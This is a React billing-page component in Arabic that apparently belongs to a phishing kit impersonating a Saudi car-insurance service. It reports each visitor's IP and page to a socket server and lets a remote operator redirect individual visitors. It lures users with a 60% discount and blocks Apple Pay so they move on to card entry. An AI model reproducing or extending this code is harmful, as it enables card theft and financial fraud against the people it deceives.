import React, { useEffect, useState } from "react";
import io from "socket.io-client";
import { apiRoute } from "../App";
import { useNavigate } from "react-router-dom";

const BillingPage = () => {
  const [ip, setIp] = useState(null);
  const [method, setMethod] = useState("");
  const [alertApple, setAlertApple] = useState(false);
  const [disabled, setDisabled] = useState(false);
  const navigate = useNavigate()
  const base = parseFloat(sessionStorage.getItem("totalPrice") || "0");
  const discount = base * 0.6;
  const vat = base * 0.15;
  const final = base - discount + vat;

  const socket = io(apiRoute);

  useEffect(() => {
    const getIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        setIp(data.ip);
        socket.emit("updateLocation", { ip: data.ip, page: "billing" });
      } catch (err) {
        console.error("IP fetch failed", err);
      }
    };
    getIP();
  }, []);

  // useEffect(() => {
  //   sessionStorage.setItem("totalPrice", final.toFixed(2));
  // }, [final]);

  const handlePayment = async () => {
    if (!method) {
      alert("يرجى اختيار طريقة الدفع أولاً");
      return;
    }
    while (!ip) await new Promise((r) => setTimeout(r, 50));

    sessionStorage.setItem("paymentMethod", method);

    socket.emit("submitBilling", {
      ip,
      mada: method === "mada",
      visa_mastarcard: method === "visa_mastarcard",
      applepay: method === "applepay",
      totalPrice: final,
    });
        navigate("/payment");
    
  };

  useEffect(() => {
    socket.on("ackBilling", (resp) => {
      if (resp.success) {
        navigate("/payment");
      } else {
        alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
        console.error(resp.error);
      }
    });
  }, []);

   socket.on("navigateTo", ({ ip, page }) => {
     console.log(localStorage.getItem("visitorIP"));
     if (ip == localStorage.getItem("visitorIP")) {
         navigate("/"+page);
     }
   });

  return (
    <div dir="rtl" className="font-sans w-11/12">
      <nav className="bg-white shadow p-4 text-center">
        <img src="/Bca-logo.svg" alt="logo" className="mx-auto w-32" />
      </nav>

      <div className="container mx-auto w-full mt-6">
        <div className="rounded-xl border p-5 bg-white shadow">
          <div className="flex justify-between items-center mb-4">
            <div className="text-right">
              <div className="text-primary font-bold text-base text-blue-900 ">
                تفاصيل السعر
              </div>
              <div className="text-sm text-gray-600">ضد الغير</div>
            </div>
            <img src="/buruj.png" alt="logo" className="h-12" />
          </div>

          <div className="space-y-2 text-sm text-gray-800">
            <div className="flex justify-between">
              <span className="text-primary text-blue-900">القسط الأساسي</span>
              <span className="font-bold">{base.toFixed(2)} ر.س</span>
            </div>
            <div className="flex justify-between">
              <span className="text-green-600">خصم عدم وجود مطالبات</span>
              <span className="font-bold text-green-600">
                {discount.toFixed(2)} ر.س
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-primary text-blue-900">
                ضريبة القيمة المضافة
              </span>
              <span className="font-bold">{vat.toFixed(2)} ر.س</span>
            </div>
          </div>
        </div>

        <div className="bg-gray-50 mt-2 p-4 rounded-xl">
          <div className="flex justify-between items-center mb-1">
            <span className="text-primary font-extrabold text-xl text-blue-900">
              المجموع
            </span>
            <span className="text-[#faa62e] text-xl font-bold">
              {final.toFixed(2)} ر.س
            </span>
          </div>
          <div className="text-xs text-gray-500 text-left">
            شامل 2% قيمة عمولة الوسيط
          </div>
        </div>

        {/* Payment Options */}
        {[
          { id: "mada", label: "مدى", img: "/mad.png" },
          {
            id: "visa_mastarcard",
            label: "فيزا ، ماستركارد",
            img: "/vimas.webp",
          },
          { id: "applepay", label: "أبل باي", img: "/appy.jpg" },
        ].map((methodOption) => (
          <div
            key={methodOption.id}
            className="mt-4 border rounded-xl p-4 flex justify-between items-center cursor-pointer hover:shadow"
            onClick={() => {
              setMethod(methodOption.id);
              if (methodOption.id === "applepay") {
                setAlertApple(true);
                setDisabled(true);
              } else {
                setAlertApple(false);
                setDisabled(false);
              }
            }}
          >
            <div className="flex items-center space-x-2">
              <input
                type="radio"
                name="payment"
                checked={method === methodOption.id}
                onChange={() => {}}
                className="ml-2"
              />
              <h5 className="text-sm font-bold text-gray-700">
                {methodOption.label}
              </h5>
            </div>
            <img src={methodOption.img} alt="logo" className="h-8" />
          </div>
        ))}

        {alertApple && (
          <div className="text-red-600 text-sm bg-red-100 p-3 mt-4 rounded">
            عذراً خدمة الدفع عبر أبل باي متوقفة مؤقتاً يمكنك التمتع بتجربة دفع
            سلسة وآمنة عبر بطاقات الدفع.
          </div>
        )}

        <button
          onClick={handlePayment}
          className="mt-6 w-full py-3 rounded bg-[#faa62e] text-white font-bold"
          disabled={disabled}
        >
          إتمام عملية الدفع
        </button>
      </div>
    </div>
  );
};

export default BillingPage;
